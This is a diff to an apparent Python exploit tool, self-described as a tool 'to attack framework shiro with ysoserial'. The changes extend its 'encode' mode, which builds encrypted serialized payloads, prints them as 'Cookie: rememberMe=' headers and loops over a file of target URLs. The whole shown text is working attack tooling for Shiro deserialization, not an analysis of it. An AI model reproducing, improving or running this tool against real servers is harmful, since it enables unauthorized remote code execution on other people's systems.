@@ -270,6 +270,9 @@ class Exploit(Command):
             print("Cookie: rememberMe={0}".format(payload.decode()))
 
     def ser_encode(self):
+        if self.key == None:
+            return
+
         with open(os.path.join(sys.path[0], self.ser),'rb') as fr:
             ser = fr.read()
 
@@ -279,7 +282,7 @@ class Exploit(Command):
             payload = Payload(self.key).gcm_encrypt(ser).decode()
 
         print("[*] Payload generation complete!")
-        print(payload)
+        print("Cookie: rememberMe={}".format(payload))
 
 class CommandFactory(Command):
     def __init__(self, mode, url, type, key, data, proxies, command, gadget, ser):
@@ -332,9 +335,18 @@ class CommandFactory(Command):
             for self.url in urls:
                 Exploit(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).ysoserial_call()
 
-        elif self.mode == "encode" and self.ser != None:
-            Exploit(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser, self.ser).ser_encode()
+        elif self.mode == "encode" and self.ser == None:
+            print("[!] The encode mode must give serialize file!")
 
+        elif self.mode == "encode" and self.ser != None and _type == 'url':
+            Exploit(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).ser_encode()
+
+        elif self.mode == "encode" and self.ser != None and _type == 'file':
+            with open(os.path.join(sys.path[0], self.url),'r') as fr:
+                urls = fr.read().splitlines()
+            for self.url in urls:
+                Exploit(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).ser_encode()
+            
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description="This is a simple tool to attack framework shiro with ysoserial")
     parser.add_argument('--mode', '-m', type=str, required=True, help='check/crack/yso/echo/encode')
